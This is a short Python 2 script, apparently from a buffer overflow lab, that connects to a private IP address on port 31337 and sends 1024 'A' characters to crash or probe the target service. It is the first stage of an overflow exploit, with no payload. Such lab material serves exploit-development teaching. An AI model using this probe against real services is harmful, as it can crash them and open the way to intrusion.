#!/usr/bin/env python2
import socket

# set up IP and PORT we are connecting to.
RHOST = "192.168.86.55"
RPORT = 31337

# create a TCP connection (socket).
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# build a message followed by a newline.
buf = ""
buf += "A" * 1024
buf += "\n"

# send message down the socket.
s.send(buf)
